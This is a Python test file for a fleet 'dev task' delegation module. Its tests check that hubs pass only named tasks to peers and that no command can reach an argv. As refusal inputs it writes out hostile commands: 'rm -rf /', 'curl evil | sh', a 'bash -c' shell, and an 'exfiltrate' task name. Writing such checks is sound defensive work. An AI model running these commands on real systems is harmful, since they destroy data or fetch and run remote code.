"""Named development tasks: the hub names one, the peer decides what the name means.

The property under test is the one the whole capability rests on -- nothing that arrives from
a model, a console or a peer may reach an argv. So these check the refusals (a request that
carries a command, an unknown name, a task this node cannot run), the registry's own soundness,
that the executor has no parameter to pass an argv through, and that the transcript a proof run
writes is judged by the *real* parser -- including the transcripts that must fail, because a
hub that records a friendlier verdict than its peer gave is the failure mode that matters.
"""
import importlib.util
import json
import os
import sys
import unittest
from pathlib import Path

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

import claim_matrix  # noqa: E402
import dev_tasks  # noqa: E402


def _module(name: str, relative: str):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, relative))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


PROOF = _module("dev_task_proof_under_test", os.path.join("runtime", "tools",
                                                          "dev_task_proof.py"))
LAB = _module("devlab_node_under_test", os.path.join("runtime", "tools", "devlab_node.py"))


class FakeRunner:
    """A SubprocessRunner double: records the argv, replays a scripted result."""

    def __init__(self, exit_code=0, stdout="", stderr=""):
        self.calls = []
        self.exit_code = exit_code
        self.stdout = stdout
        self.stderr = stderr

    def argv_for(self, argv):
        return [str(item) for item in argv]

    def run(self, argv, cwd, timeout):
        self.calls.append({"argv": list(argv), "cwd": cwd, "timeout": timeout})
        return self.exit_code, self.stdout, self.stderr


class FakeAudit:
    def __init__(self):
        self.events = []

    def append(self, event_type, payload):
        self.events.append((event_type, dict(payload)))

    def kinds(self):
        return [event for event, _ in self.events]


class FakeAgent:
    """The hub's surface: one peer, an id, a delegation channel that records the payload."""

    def __init__(self, peers=(), node_id="shugo-desktop", response=None):
        self.node_id = node_id
        self.telemetry = {"mesh_peers": [dict(peer) for peer in peers]}
        self.sent = []
        self.response = response or {"status": "delegated", "peer": "peer"}
        self.logged = []

    def _mesh_delegate(self, peer, payload):
        self.sent.append({"peer": peer, "payload": dict(payload)})
        return dict(self.response)

    def log(self, category, message):
        self.logged.append((category, message))


def _peers():
    return [{"device_id": "shugo-mac", "priority": 10},
            {"device_id": "shugo-phone", "priority": 500}]


class TheRegistryTestCase(unittest.TestCase):
    def test_the_shipped_registry_is_sound(self):
        self.assertEqual(dev_tasks.validate_registry(), [])

    def test_every_task_names_the_hive_can_ask_for(self):
        self.assertEqual(dev_tasks.known_tasks(),
                         ["build_rpc_server", "fleet_status", "git_pull",
                          "node_consistency", "run_tests"])

    def test_names_are_exact_so_a_typo_cannot_reach_a_different_task(self):
        self.assertIsNone(dev_tasks.resolve_task("RUN_TESTS"))
        self.assertIsNone(dev_tasks.resolve_task("run_test"))
        self.assertIsNotNone(dev_tasks.resolve_task("run_tests"))

    def test_a_registry_that_smuggles_a_value_is_rejected(self):
        broken = {"bad_task": {"description": "x", "argv": ["git", "pull", "{branch}"],
                               "timeout": 10.0, "read_only": True}}
        problems = dev_tasks.validate_registry(broken)
        self.assertTrue(problems, "a placeholder in an argv was accepted")
        self.assertIn("built from a value", problems[0])

    def test_an_empty_or_non_string_argv_is_rejected(self):
        for argv in ([], "git pull", [""]):
            problems = dev_tasks.validate_registry(
                {"t": {"description": "x", "argv": argv, "timeout": 10.0}})
            self.assertTrue(problems, argv)

    def test_the_interpreter_placeholder_is_the_only_one_allowed(self):
        problems = dev_tasks.validate_registry(
            {"t": {"description": "x", "argv": [dev_tasks.PY, "-m", "pytest"],
                   "timeout": 10.0}})
        self.assertEqual(problems, [])


class ThePeerRunsTheTaskTestCase(unittest.TestCase):
    """The node's half: resolve the name, check the node, run the registry's argv."""

    def test_the_peer_runs_the_registry_argv_and_not_the_request(self):
        runner = FakeRunner(stdout="all good")
        audit = FakeAudit()
        result = dev_tasks.run_named_task("node_consistency", runner=runner, audit=audit,
                                          requested_by="shugo-desktop")
        self.assertEqual(result["status"], "success")
        self.assertTrue(result["ok"])
        self.assertEqual(runner.calls[0]["argv"], [dev_tasks.PY,
                                                   "scripts/node_consistency.py"])
        self.assertEqual(audit.kinds(), ["dev_task_started", "dev_task_finished"])
        self.assertEqual(audit.events[0][1]["requested_by"], "shugo-desktop")
        self.assertEqual(audit.events[1][1]["exit"], 0)

    def test_the_wire_payload_a_peer_reports_is_only_a_name(self):
        result = dev_tasks.run_named_task("git_pull", runner=FakeRunner())
        self.assertEqual(result["sent"],
                         {"action_type": "dev_task", "params": {"task": "git_pull"}})

    def test_the_executor_has_no_parameter_for_an_argv(self):
        # The strongest form of the property: you cannot pass one, so you cannot be tricked
        # into passing one.
        with self.assertRaises(TypeError):
            dev_tasks.run_named_task("run_tests", extra_argv=["--co"])  # type: ignore[call-arg]
        with self.assertRaises(TypeError):
            dev_tasks.run_named_task(task="run_tests", argv=["rm", "-rf", "/"])  # type: ignore[call-arg]

    def test_an_unknown_name_is_refused_with_the_names_this_node_knows(self):
        result = dev_tasks.run_named_task("exfiltrate", runner=FakeRunner())
        self.assertEqual(result["status"], "refused")
        self.assertIn("unknown task", result["reason"])
        self.assertIn("run_tests", result["reason"])

    def test_a_task_this_node_cannot_run_says_which_piece_is_missing(self):
        result = dev_tasks.run_named_task("run_tests", runner=FakeRunner(),
                                          which=lambda name: None,
                                          find_module=lambda name: None)
        self.assertEqual(result["status"], "refused")
        self.assertIn("not available on this node", result["reason"])
        self.assertIn("pytest", result["reason"])

    def test_a_non_zero_exit_is_reported_as_a_failure_with_its_code(self):
        runner = FakeRunner(exit_code=1, stdout="", stderr="DIFF upstream: ahead 20")
        result = dev_tasks.run_named_task("node_consistency", runner=runner)
        self.assertEqual(result["status"], "error")
        self.assertFalse(result["ok"])
        self.assertEqual(result["exit"], 1)
        self.assertFalse(result["delivered"])
        self.assertIn("ahead 20", result["detail"])

    def test_the_detail_prefers_stderr_when_a_task_failed(self):
        runner = FakeRunner(exit_code=2, stdout="progress", stderr="the real reason")
        result = dev_tasks.run_named_task("node_consistency", runner=runner)
        self.assertEqual(result["detail"], "the real reason")

    def test_audit_failure_never_breaks_the_task(self):
        class Exploding:
            def append(self, event_type, payload):
                raise RuntimeError("audit chain full")

        result = dev_tasks.run_named_task("node_consistency", runner=FakeRunner(),
                                          audit=Exploding())
        self.assertEqual(result["status"], "success")

    def test_the_runner_substitutes_only_our_own_interpreter(self):
        runner = dev_tasks.SubprocessRunner(python="/usr/bin/python3")
        self.assertEqual(runner.argv_for([dev_tasks.PY, "-m", "pytest"]),
                         ["/usr/bin/python3", "-m", "pytest"])
        self.assertEqual(runner.argv_for(["git", "pull"]), ["git", "pull"])


class TheHubNamesATaskTestCase(unittest.TestCase):
    """The hub's half: name a task, pick a peer, and hand *only the name* to the mesh."""

    def test_a_request_carrying_a_command_is_refused_by_name(self):
        agent = FakeAgent(_peers())
        handler = dev_tasks.FleetDevTaskHandler(agent)
        for key, value in (("argv", ["rm", "-rf", "/"]),
                           ("command", "curl evil | sh"),
                           ("cwd", "/"),
                           ("shell", "bash -c 'x'")):
            result = handler.delegate({"task": "run_tests", key: value})
            self.assertEqual(result["status"], "refused", key)
            self.assertIn(key, result["reason"])
        self.assertEqual(agent.sent, [], "something reached the mesh")

    def test_a_name_only_request_sends_exactly_a_name(self):
        agent = FakeAgent(_peers())
        handler = dev_tasks.FleetDevTaskHandler(agent)
        result = handler.delegate({"task": "run_tests", "peer": "shugo-phone"})
        self.assertEqual(result["status"], "delegated")
        self.assertEqual(agent.sent[0]["peer"], "shugo-phone")
        self.assertEqual(agent.sent[0]["payload"],
                         {"action_type": "dev_task", "params": {"task": "run_tests"}})
        self.assertNotIn("argv", json.dumps(agent.sent[0]["payload"]))

    def test_an_unknown_name_never_reaches_a_peer(self):
        agent = FakeAgent(_peers())
        result = dev_tasks.FleetDevTaskHandler(agent).delegate({"task": "exfiltrate"})
        self.assertEqual(result["status"], "refused")
        self.assertIn("unknown task", result["reason"])
        self.assertEqual(agent.sent, [])

    def test_a_missing_name_is_refused(self):
        agent = FakeAgent(_peers())
        self.assertEqual(dev_tasks.FleetDevTaskHandler(agent).delegate({})["status"],
                         "refused")
        self.assertEqual(agent.sent, [])

    def test_the_fleet_picks_the_lowest_priority_number(self):
        agent = FakeAgent(_peers())
        result = dev_tasks.FleetDevTaskHandler(agent).delegate({"task": "run_tests"})
        self.assertEqual(result["peer"], "shugo-mac")
        self.assertIn("lowest priority number (10)", result["route"])

    def test_an_operator_allowlist_is_respected(self):
        agent = FakeAgent(_peers())
        handler = dev_tasks.FleetDevTaskHandler(agent, allowed_peers=["shugo-phone"])
        result = handler.delegate({"task": "run_tests", "peer": "shugo-mac"})
        self.assertEqual(result["status"], "refused")
        self.assertIn("allowlist", result["reason"])
        self.assertEqual(agent.sent, [])

    def test_a_quiet_fleet_says_so_instead_of_delegating_to_nobody(self):
        agent = FakeAgent([])
        result = dev_tasks.FleetDevTaskHandler(agent).delegate({"task": "run_tests"})
        self.assertEqual(result["status"], "refused")
        self.assertIn("quiet mesh", result["reason"])

    def test_a_node_without_a_delegation_channel_refuses(self):
        class NoChannel(FakeAgent):
            _mesh_delegate = None

        result = dev_tasks.FleetDevTaskHandler(NoChannel(_peers())).delegate(
            {"task": "run_tests"})
        self.assertEqual(result["status"], "refused")
        self.assertIn("delegation channel", result["reason"])

    def test_the_handler_reads_its_params_from_a_decision(self):
        agent = FakeAgent(_peers())
        result = dev_tasks.FleetDevTaskHandler(agent).handle(
            {"action_type": "fleet_dev_task", "params": {"task": "git_pull"}})
        self.assertEqual(result["status"], "delegated")
        self.assertEqual(agent.sent[0]["payload"]["params"]["task"], "git_pull")

    def test_registration_wires_the_layer_and_the_vocabulary(self):
        class Layer:
            def __init__(self):
                self.registered = {}

            def register_handler(self, action_type, handler):
                self.registered[action_type] = handler

        class Policy:
            FLEET_ACTION_TYPES = {"fleet_deploy"}
            KNOWN_ACTION_TYPES = {"fleet_deploy"}

        layer = Layer()
        registered = dev_tasks.register_dev_task_handlers(
            layer, dev_tasks.FleetDevTaskHandler(FakeAgent(_peers())),
            policy_module=Policy)
        self.assertEqual(registered, [dev_tasks.DEV_TASK_ACTION])
        self.assertIn(dev_tasks.DEV_TASK_ACTION, layer.registered)
        self.assertIn(dev_tasks.DEV_TASK_ACTION, Policy.FLEET_ACTION_TYPES)
        self.assertIn(dev_tasks.DEV_TASK_ACTION, Policy.KNOWN_ACTION_TYPES)


def _facts(**overrides):
    """A proof run's facts, shaped exactly as the producer fills them."""
    facts = {
        "task": "node_consistency", "peer": "shugo-devlab", "hub": "shugo-desktop",
        "peer_priority": 500, "hub_role": "primary", "lease": "shugo-desktop",
        "peers": ["shugo-devlab"], "token": True,
        "consent": "granted 'fleet_dev_task' by dev_task_proof (operator console) (ttl 600s)",
        "approval": "operator channel attached; requested 1 approval(s) -> granted",
        "gate": "DecisionEngine._gate_decision (consent + approval) -> _execute_gated",
        "named_peer": "shugo-devlab",
        "engine": {"status": "delegated", "task": "node_consistency",
                   "peer": "shugo-devlab", "route": "named by the request",
                   "registered": True, "message": "", "keys": ""},
        "wire": {"action_type": "dev_task", "params": {"task": "node_consistency"}},
        "peer_lines": [
            "INFO:dev_tasks:dev_task node_consistency requested by shugo-desktop: "
            "exit=0 ok=True in 3.78s argv=['C:\\Python310\\python.exe', "
            "'scripts/node_consistency.py']",
            '[devlab-audit] dev_task_started {"task": "node_consistency"}',
            '[devlab-audit] dev_task_finished {"exit": 0, "task": "node_consistency"}',
            '[devlab-log] [MESH] ran delegated dev_task for shugo-desktop: success',
        ],
        "result": {"status": "success", "action_type": "dev_task", "delivered": True,
                   "reason": "node consistency: PASS"},
        "hub_logs": ["[FLEET] dev task named: node_consistency -> shugo-devlab"],
    }
    facts.update(overrides)
    return facts


class TheProofTranscriptTestCase(unittest.TestCase):
    """The transcript is only evidence if the real parser accepts it -- and rejects the
    transcripts where the hub says something a peer did not."""

    def _text(self, **overrides):
        return "\n".join(PROOF.transcript_lines(_facts(**overrides)))

    def test_a_healthy_run_is_proven_by_the_real_parser(self):
        ok, detail = claim_matrix.dev_task_ran(self._text())
        self.assertTrue(ok, detail)
        self.assertIn("exit 0", detail)

    def test_the_peer_s_words_are_quoted_as_the_peer_s(self):
        text = self._text()
        self.assertIn("peer ran: INFO:dev_tasks:dev_task node_consistency", text)
        self.assertIn("the peer's own process said this", text)
        self.assertIn("peer audit: dev_task_finished", text)
        self.assertIn("peer log: [MESH] ran delegated dev_task", text)

    def test_the_gates_are_stated_and_the_wire_precedes_the_outcome(self):
        text = self._text()
        self.assertIn("consent: granted 'fleet_dev_task'", text)
        self.assertIn("approval: operator channel attached", text)
        self.assertIn("wire payload (a name, not an argv)", text)
        self.assertLess(text.index("wire payload"), text.index("verdict:"))

    def test_a_run_with_no_peer_execution_is_not_proven(self):
        ok, detail = claim_matrix.dev_task_ran(self._text(peer_lines=[]))
        self.assertFalse(ok)
        self.assertIn("peer's own process", detail)

    def test_a_hub_recording_a_friendlier_verdict_is_not_proven(self):
        # The failure that matters: the peer said exit=1 and the hub's record says success.
        text = self._text(peer_lines=[
            "INFO:dev_tasks:dev_task node_consistency requested by shugo-desktop: "
            "exit=1 ok=False in 3.78s argv=['python.exe', 'scripts/node_consistency.py']"])
        ok, detail = claim_matrix.dev_task_ran(text)
        self.assertFalse(ok)
        self.assertIn("success/delivered=True", detail)

    def test_a_failing_task_is_still_proven_when_the_hub_records_it_truthfully(self):
        text = self._text(peer_lines=[
            "INFO:dev_tasks:dev_task node_consistency requested by shugo-desktop: "
            "exit=1 ok=False in 3.78s argv=['python.exe', 'scripts/node_consistency.py']"],
            result={"status": "error", "action_type": "dev_task", "delivered": False,
                    "reason": "DIFF upstream: ahead 20"})
        ok, detail = claim_matrix.dev_task_ran(text)
        self.assertTrue(ok, detail)
        self.assertIn("exit 1", detail)

    def test_a_wire_payload_carrying_more_than_a_name_is_not_proven(self):
        ok, detail = claim_matrix.dev_task_ran(
            self._text(wire={"action_type": "dev_task",
                             "params": {"task": "run_tests", "argv": ["--co"]}}))
        self.assertFalse(ok)
        self.assertIn("more than a task name", detail)

    def test_a_run_whose_result_never_came_back_is_not_proven(self):
        ok, detail = claim_matrix.dev_task_ran(self._text(result={}))
        self.assertFalse(ok)
        self.assertIn("never reached the hub", detail)


class TheWiringTestCase(unittest.TestCase):
    """A node only accepts what it can perform, and the engine gates what it can propose."""

    def test_a_node_will_accept_a_delegated_dev_task(self):
        import shugocore_agent
        self.assertIn(dev_tasks.DELEGATE_ACTION, shugocore_agent.DELEGATABLE_ACTIONS)

    def test_the_agent_dispatches_a_delegated_dev_task(self):
        source = Path(ROOT, "shugocore_agent.py").read_text(encoding="utf-8")
        self.assertIn('"dev_task": self._execute_dev_task', source)
        self.assertIn("def _execute_dev_task", source)

    def test_the_engine_consent_gates_naming_a_task(self):
        import decision_engine
        import policy
        self.assertIn(dev_tasks.DEV_TASK_ACTION, policy.FLEET_ACTION_TYPES)
        self.assertIn(dev_tasks.DEV_TASK_ACTION,
                      decision_engine._CONSENT_GATED_ACTION_TYPES)

    def test_dev_tasks_is_deliberately_not_in_the_android_bundle(self):
        # Host-only, like fleet_deploy: a phone has no registry to enforce a name against.
        bundle = Path(ROOT, "platforms", "android", "app", "src", "main", "python")
        if not bundle.exists():
            self.skipTest("no android bundle in this checkout")
        self.assertFalse((bundle / "dev_tasks.py").exists())

    def test_a_fleet_handler_can_actually_be_registered_on_the_execution_layer(self):
        # The allowlist in ExecutionLayer.register_handler once predated the fleet action
        # class, so every fleet handler registration raised and the wiring was dead while
        # looking installed. This is that regression, pinned.
        from execution_layer import ExecutionLayer
        layer = ExecutionLayer()
        layer.register_handler(dev_tasks.DEV_TASK_ACTION, lambda decision: {"status": "ok"})
        self.assertIn(dev_tasks.DEV_TASK_ACTION, layer._handlers)

    def test_the_lab_node_reports_its_own_transport(self):
        state = LAB.state_line(FakeAgent(_peers()))
        for key in ("received", "sent", "connected_peers", "mesh_role", "election_primary"):
            self.assertIn(key, state)

    def test_the_lab_node_reads_audit_entries_whose_event_key_is_type(self):
        # The chain writes {"type": ...}; a poller that only knows "event_type" reports
        # nothing, which is how a run looks honest and empty at the same time.
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "audit_chain.jsonl"
            path.write_text(json.dumps({"type": "dev_task_finished",
                                        "payload": {"exit": 0}}) + "\n", encoding="utf-8")
            events, seen = LAB.read_new_events(str(path), 0)
        self.assertEqual([kind for kind, _ in events], ["dev_task_finished"])
        self.assertEqual(seen, 1)




